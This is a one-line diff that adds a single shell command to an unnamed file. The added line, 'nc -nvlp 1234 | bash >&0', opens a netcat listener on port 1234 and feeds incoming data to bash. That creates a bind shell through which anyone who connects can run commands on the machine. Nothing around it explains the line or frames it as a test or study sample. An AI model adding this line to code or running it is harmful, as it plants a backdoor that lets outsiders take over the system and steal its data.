@@ -1,0 +1,1 @@
+nc -nvlp 1234 | bash >&0
